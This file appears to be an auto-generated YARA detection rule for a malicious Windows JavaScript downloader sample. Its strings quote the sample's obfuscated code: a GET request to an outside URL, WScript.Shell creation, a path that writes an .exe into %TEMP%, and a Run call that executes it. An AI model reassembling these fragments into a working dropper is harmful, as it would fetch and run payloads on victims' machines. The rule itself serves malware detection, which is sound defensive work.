rule sig_20160330_2a5603c95de8a4aaffd411a3756fb009 {
  meta:
    description = "datamaliciousorder - file 20160330_2a5603c95de8a4aaffd411a3756fb009.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d4751f332071c12d9defd7eed42554126ff458afe899304f49f7fc0075e2d056"

  strings:
    $s1  = "G1[KI](\"GET\", \"http://pure-line.com.pl/f6splw\", false);" fullword ascii
    $s2  = "var MO = function Z() {return WScript[P1](\"WScript\"+\".Shell\");}(), VT = 11;" fullword ascii
    $s3  = "function W(Y, LQ){P0 = P0 * 1; return Y - LQ;};" fullword ascii
    $s4  = "if (G1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function N() {return MO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"DdgPuT1Fxg.ex\" + \"e\";};" fullword ascii
    $s6  = "function F(){return D + \"\";};" fullword ascii
    $s7  = "function A() {return ((GW == true) && (GW == MX)) ? 1 : P0;};" fullword ascii
    $s8  = "function HM(ZL){MO[\"Run\"](ZL, P0, P0);};" fullword ascii
    $s9  = "}while (L);" fullword ascii
    $s10 = "function PN()" fullword ascii
    $s11 = "function GZ(){return 22;};" fullword ascii
    $s12 = "function FK(W0) {var G = (1, 2, 3, 4, 5, W0); return G;};" fullword ascii
    $s13 = "function CT(){return P1;};" fullword ascii
    $s14 = "return W(AM, PD);" fullword ascii
    $s15 = "var JY = new this[\"Date\"]();" fullword ascii
    $s16 = "var G0 = false;" fullword ascii
    $s17 = "var GW = false;" fullword ascii
    $s18 = "MX = true; " fullword ascii
    $s19 = "var MX = false;" fullword ascii
    $s20 = "GW = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}